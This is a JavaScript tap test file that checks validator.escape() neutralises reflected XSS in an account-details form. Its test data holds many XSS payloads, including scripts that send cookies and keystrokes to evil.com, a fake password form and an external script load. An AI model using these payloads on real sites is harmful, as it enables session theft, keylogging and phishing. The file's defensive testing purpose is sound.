const tap = require('tap');
const validator = require('validator');

/**
 * Reflected XSS Prevention Tests
 *
 * These tests verify that the remediation for the Reflected XSS vulnerability
 * in routes/index.js at line 108 (save_account_details function) is effective.
 * The fix sanitizes user input using validator.escape() before rendering to prevent
 * malicious script injection through HTML special characters.
 */

tap.test('Reflected XSS Prevention - Input Sanitization', (t) => {

  t.test('validator.escape should convert HTML special characters to entities', (t) => {
    // GIVEN: Various HTML special characters that could enable XSS
    const testCases = [
      { input: '<script>alert(1)</script>', expected: '&lt;script&gt;alert(1)&lt;&#x2F;script&gt;' },
      { input: '<img src=x onerror=alert(1)>', expected: '&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;' },
      { input: '" onload="alert(1)"', expected: '&quot; onload&#x3D;&quot;alert(1)&quot;' },
      { input: "' onload='alert(1)'", expected: '&#x27; onload&#x3D;&#x27;alert(1)&#x27;' },
      { input: 'javascript:alert(1)', expected: 'javascript:alert(1)' }, // URLs stay the same but are safe in HTML entity context
      { input: '<iframe src="evil.com">', expected: '&lt;iframe src&#x3D;&quot;evil.com&quot;&gt;' }
    ];

    testCases.forEach(({ input, expected }) => {
      // WHEN: Sanitizing input with validator.escape
      const sanitized = validator.escape(input);

      // THEN: HTML special characters should be converted to entities
      t.equal(sanitized, expected, `Should escape: ${input}`);
    });

    t.end();
  });

  t.test('firstname field should be sanitized against XSS', (t) => {
    // GIVEN: Malicious firstname values attempting XSS
    const maliciousFirstnames = [
      '<script>alert("XSS")</script>',
      '"><script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'John<script>document.cookie</script>',
      '\'><svg/onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>'
    ];

    maliciousFirstnames.forEach(malicious => {
      // WHEN: Applying the fix (validator.escape)
      const sanitized = validator.escape(malicious);

      // THEN: No script tags or event handlers should remain executable
      t.notMatch(sanitized, /<script/i, `Script tag escaped in: ${malicious}`);
      t.notMatch(sanitized, /onerror=/i, `Event handler escaped in: ${malicious}`);
      t.notMatch(sanitized, /onload=/i, `Onload handler escaped in: ${malicious}`);
      t.notMatch(sanitized, /<iframe/i, `Iframe tag escaped in: ${malicious}`);
      t.match(sanitized, /&lt;|&gt;|&quot;|&#x27;|&#x3D;|&#x2F;/, `Contains HTML entities: ${malicious}`);
    });

    t.end();
  });

  t.test('lastname field should be sanitized against XSS', (t) => {
    // GIVEN: Malicious lastname with XSS payload
    const maliciousLastnames = [
      'Doe<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
      'Smith" onclick="alert(document.domain)"',
      "O'Brien'><img src=x onerror=alert(1)>",
      'Test</textarea><script>alert(1)</script>'
    ];

    maliciousLastnames.forEach(malicious => {
      // WHEN: Sanitizing with validator.escape
      const sanitized = validator.escape(malicious);

      // THEN: XSS payloads should be neutralized
      t.notMatch(sanitized, /<script/i, `Script in lastname escaped: ${malicious}`);
      t.notMatch(sanitized, /onclick=/i, `Click handler escaped: ${malicious}`);
      t.notMatch(sanitized, /<img/i, `Image tag escaped: ${malicious}`);
      t.ok(sanitized.includes('&lt;') || sanitized.includes('&gt;') ||
           sanitized.includes('&quot;') || sanitized.includes('&#x27;'),
           `HTML entities present: ${malicious}`);
    });

    t.end();
  });

  t.test('country field should be sanitized against XSS', (t) => {
    // GIVEN: Malicious country values
    const maliciousCountries = [
      'USA<script>alert(1)</script>',
      'UK"><svg/onload=alert(1)>',
      'Canada\' onmouseover=\'alert(1)',
      '<a href="javascript:alert(1)">France</a>'
    ];

    maliciousCountries.forEach(malicious => {
      // WHEN: Applying sanitization
      const sanitized = validator.escape(malicious);

      // THEN: XSS vectors should be escaped
      t.notMatch(sanitized, /<script/i, `Country script tag escaped: ${malicious}`);
      t.notMatch(sanitized, /<svg/i, `SVG tag escaped: ${malicious}`);
      t.notMatch(sanitized, /onmouseover=/i, `Mouse event escaped: ${malicious}`);
      t.notMatch(sanitized, /<a href/i, `Link tag escaped: ${malicious}`);
    });

    t.end();
  });

  t.test('phone field should be sanitized against XSS', (t) => {
    // GIVEN: Malicious phone numbers with XSS payloads
    const maliciousPhones = [
      '555-1234<script>alert(1)</script>',
      '+1-555-1234" onload="alert(1)"',
      '123456789\'><img src=x onerror=alert(1)>'
    ];

    maliciousPhones.forEach(malicious => {
      // WHEN: Sanitizing phone input
      const sanitized = validator.escape(malicious);

      // THEN: Script injection should be prevented
      t.notMatch(sanitized, /<script/i, `Phone script escaped: ${malicious}`);
      t.notMatch(sanitized, /onload=/i, `Phone onload escaped: ${malicious}`);
      t.notMatch(sanitized, /onerror=/i, `Phone onerror escaped: ${malicious}`);
    });

    t.end();
  });

  t.test('email field should be sanitized against XSS', (t) => {
    // GIVEN: Malicious email addresses with XSS attempts
    const maliciousEmails = [
      'user@example.com<script>alert(1)</script>',
      'test"><img src=x onerror=alert(1)>@evil.com',
      'admin@test.com\'><svg/onload=alert(document.cookie)>'
    ];

    maliciousEmails.forEach(malicious => {
      // WHEN: Escaping email input
      const sanitized = validator.escape(malicious);

      // THEN: XSS payloads should be neutralized
      t.notMatch(sanitized, /<script/i, `Email script escaped: ${malicious}`);
      t.notMatch(sanitized, /<img/i, `Email img escaped: ${malicious}`);
      t.notMatch(sanitized, /<svg/i, `Email svg escaped: ${malicious}`);
    });

    t.end();
  });

  t.test('attribute-breaking XSS attempts should be neutralized', (t) => {
    // The vulnerability allows injection into HTML attributes like value="{{firstname}}"
    // Attackers can break out of attributes to inject event handlers

    const attributeBreakingPayloads = [
      {
        name: 'quote break with event handler',
        payload: '" onclick="alert(1)',
        description: 'Breaks out of value attribute to add onclick'
      },
      {
        name: 'quote break with new attribute',
        payload: '" autofocus onfocus="alert(1)',
        description: 'Adds autofocus and onfocus attributes'
      },
      {
        name: 'quote break closing tag',
        payload: '"></input><script>alert(1)</script>',
        description: 'Closes input tag and adds script'
      },
      {
        name: 'single quote break',
        payload: "' onload='alert(1)",
        description: 'Breaks with single quote'
      },
      {
        name: 'space and quote break',
        payload: '" style="x:expression(alert(1))',
        description: 'IE-specific CSS expression injection'
      }
    ];

    attributeBreakingPayloads.forEach(({ name, payload, description }) => {
      // WHEN: Sanitizing attribute-breaking payloads
      const sanitized = validator.escape(payload);

      // THEN: Quotes should be escaped, preventing attribute breakout
      t.ok(!sanitized.includes('" on'), `${name}: double quote escaped`);
      t.ok(!sanitized.includes("' on"), `${name}: single quote escaped`);
      t.ok(sanitized.includes('&quot;') || sanitized.includes('&#x27;'),
           `${name}: quotes converted to entities`);
      t.comment(`${name}: ${description}`);
    });

    t.end();
  });

  t.test('context-specific XSS vectors should be blocked', (t) => {
    // Different contexts require different escaping - test comprehensive coverage

    const contextualPayloads = [
      {
        context: 'HTML context',
        payload: '<div>malicious</div>',
        shouldNotContain: ['<div>', '</div>']
      },
      {
        context: 'Attribute context',
        payload: '" autofocus="',
        shouldNotContain: ['" autofocus="']
      },
      {
        context: 'JavaScript context attempt',
        payload: '</script><script>alert(1)</script>',
        shouldNotContain: ['</script>', '<script>']
      },
      {
        context: 'URL context',
        payload: 'javascript:alert(1)',
        shouldContain: ['javascript:alert(1)'] // URL schemes are preserved but escaped in HTML
      },
      {
        context: 'CSS context attempt',
        payload: '<style>body{background:url("javascript:alert(1)")}</style>',
        shouldNotContain: ['<style>', '</style>']
      }
    ];

    contextualPayloads.forEach(({ context, payload, shouldNotContain, shouldContain }) => {
      // WHEN: Escaping the payload
      const sanitized = validator.escape(payload);

      // THEN: Context-specific attacks should be neutralized
      if (shouldNotContain) {
        shouldNotContain.forEach(dangerous => {
          t.notOk(sanitized.includes(dangerous),
                  `${context}: "${dangerous}" should be escaped`);
        });
      }

      if (shouldContain) {
        shouldContain.forEach(safe => {
          t.ok(sanitized.includes(safe),
               `${context}: "${safe}" should be preserved`);
        });
      }
    });

    t.end();
  });

  t.test('legitimate user input should remain readable after sanitization', (t) => {
    // GIVEN: Normal, legitimate user inputs
    const legitimateInputs = [
      { field: 'firstname', value: 'John', expected: 'John' },
      { field: 'lastname', value: 'O\'Brien', expected: 'O&#x27;Brien' }, // Apostrophe encoded but readable
      { field: 'country', value: 'USA', expected: 'USA' },
      { field: 'phone', value: '+1-555-1234', expected: '+1-555-1234' },
      { field: 'email', value: 'john@example.com', expected: 'john@example.com' },
      { field: 'firstname', value: 'Marie-Claire', expected: 'Marie-Claire' },
      { field: 'country', value: 'São Paulo', expected: 'São Paulo' } // Unicode preserved
    ];

    legitimateInputs.forEach(({ field, value, expected }) => {
      // WHEN: Sanitizing legitimate input
      const sanitized = validator.escape(value);

      // THEN: Content should be preserved or minimally altered
      t.equal(sanitized, expected, `${field}: "${value}" handled correctly`);
      // Verify no unnecessary encoding of safe characters
      t.notOk(sanitized.includes('&lt;') && !value.includes('<'),
              `${field}: no over-sanitization`);
    });

    t.end();
  });

  t.test('combined field sanitization (simulating full profile)', (t) => {
    // Simulate the actual remediation flow for save_account_details

    // GIVEN: A profile object with mixed legitimate and malicious data
    const profile = {
      firstname: 'Alice<script>alert(1)</script>',
      lastname: 'Smith" onclick="alert(1)"',
      country: 'USA',
      phone: '+1-555-1234\'><img src=x onerror=alert(1)>',
      email: 'alice@example.com'
    };

    // WHEN: Applying the fix (sanitizing all fields as in the remediation)
    const sanitizedProfile = {
      firstname: validator.escape(profile.firstname),
      lastname: validator.escape(profile.lastname),
      country: validator.escape(profile.country),
      phone: validator.escape(profile.phone),
      email: validator.escape(profile.email)
    };

    // THEN: All fields should be sanitized
    t.notMatch(sanitizedProfile.firstname, /<script/i, 'Firstname script removed');
    t.notMatch(sanitizedProfile.lastname, /onclick=/i, 'Lastname onclick removed');
    t.equal(sanitizedProfile.country, 'USA', 'Clean country unchanged');
    t.notMatch(sanitizedProfile.phone, /<img/i, 'Phone img tag removed');
    t.equal(sanitizedProfile.email, 'alice@example.com', 'Clean email unchanged');

    // Verify HTML entities are present for malicious input
    t.ok(sanitizedProfile.firstname.includes('&lt;'), 'Firstname contains HTML entities');
    t.ok(sanitizedProfile.lastname.includes('&quot;') ||
         sanitizedProfile.lastname.includes('&#x3D;'), 'Lastname contains HTML entities');
    t.ok(sanitizedProfile.phone.includes('&lt;') ||
         sanitizedProfile.phone.includes('&#x27;'), 'Phone contains HTML entities');

    t.end();
  });

  t.test('reflected XSS attack scenarios should be prevented', (t) => {
    // Real-world attack scenarios that would work before the fix

    const attackScenarios = [
      {
        name: 'Credential theft via XSS',
        payload: '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
        description: 'Attacker tries to steal session cookies'
      },
      {
        name: 'Keylogger injection',
        payload: '<script>document.onkeypress=function(e){fetch("http://evil.com?key="+e.key)}</script>',
        description: 'Attacker tries to log keystrokes'
      },
      {
        name: 'DOM manipulation',
        payload: '<script>document.body.innerHTML="<h1>Site Defaced</h1>"</script>',
        description: 'Attacker tries to deface the page'
      },
      {
        name: 'Phishing form injection',
        payload: '"><form action="http://evil.com"><input name="password" placeholder="Re-enter password"></form>',
        description: 'Attacker tries to inject a fake login form'
      },
      {
        name: 'Redirect attack',
        payload: '<script>window.location="http://evil.com"</script>',
        description: 'Attacker tries to redirect to malicious site'
      }
    ];

    attackScenarios.forEach(({ name, payload, description }) => {
      // WHEN: Applying the fix
      const sanitized = validator.escape(payload);

      // THEN: Attack should be neutralized
      t.notMatch(sanitized, /<script>/i, `${name}: script tags escaped`);
      t.notMatch(sanitized, /<form/i, `${name}: form tags escaped`);
      t.ok(sanitized.includes('&lt;') || sanitized.includes('&gt;'),
           `${name}: HTML brackets converted to entities`);
      t.comment(`Blocked: ${description}`);
    });

    t.end();
  });

  t.test('edge cases and special scenarios', (t) => {
    // GIVEN: Edge cases that might bypass naive sanitization

    const edgeCases = [
      { input: '', expected: '', description: 'empty string' },
      { input: '   ', expected: '   ', description: 'whitespace only' },
      { input: '&lt;script&gt;', expected: '&amp;lt;script&amp;gt;', description: 'already encoded' },
      { input: '<<script>alert(1)<</script>', expected: '&lt;&lt;script&gt;alert(1)&lt;&lt;&#x2F;script&gt;', description: 'doubled brackets' },
      { input: '<SCRIPT>alert(1)</SCRIPT>', expected: '&lt;SCRIPT&gt;alert(1)&lt;&#x2F;SCRIPT&gt;', description: 'uppercase tags' },
      { input: '<scr\tipt>alert(1)</scr\tipt>', expected: '&lt;scr\tipt&gt;alert(1)&lt;&#x2F;scr\tipt&gt;', description: 'tab in tag name' },
      { input: '<script src="http://evil.com/xss.js">', expected: '&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;evil.com&#x2F;xss.js&quot;&gt;', description: 'external script' }
    ];

    edgeCases.forEach(({ input, expected, description }) => {
      // WHEN: Sanitizing edge case
      const sanitized = validator.escape(input);

      // THEN: Should handle correctly
      t.equal(sanitized, expected, `Edge case handled: ${description}`);
    });

    t.end();
  });

  t.test('unicode and international characters should be preserved', (t) => {
    // GIVEN: International names and characters
    const internationalInputs = [
      { value: 'François', description: 'French name with cedilla' },
      { value: 'José', description: 'Spanish name with accent' },
      { value: '山田太郎', description: 'Japanese name' },
      { value: '김철수', description: 'Korean name' },
      { value: 'Müller', description: 'German name with umlaut' },
      { value: 'Владимир', description: 'Russian name in Cyrillic' },
      { value: 'محمد', description: 'Arabic name' }
    ];

    internationalInputs.forEach(({ value, description }) => {
      // WHEN: Escaping international input
      const sanitized = validator.escape(value);

      // THEN: Characters should be preserved
      t.equal(sanitized, value, `Unicode preserved: ${description}`);
      t.ok(sanitized.length > 0, `Not empty after sanitization: ${description}`);
    });

    t.end();
  });

  t.end();
});
